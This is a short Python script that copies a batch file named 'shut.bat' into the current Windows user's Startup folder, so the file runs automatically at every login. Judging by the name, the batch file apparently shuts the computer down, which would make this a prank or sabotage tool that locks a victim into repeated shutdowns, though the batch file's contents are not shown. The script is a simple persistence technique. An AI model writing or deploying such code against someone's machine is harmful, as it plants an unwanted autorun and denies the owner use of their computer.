import os
import getpass
from shutil import copy
d= os.getcwd()
c=getpass.getuser()
copy(d+'\\shut.bat',"C:\\Users\\"+c+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
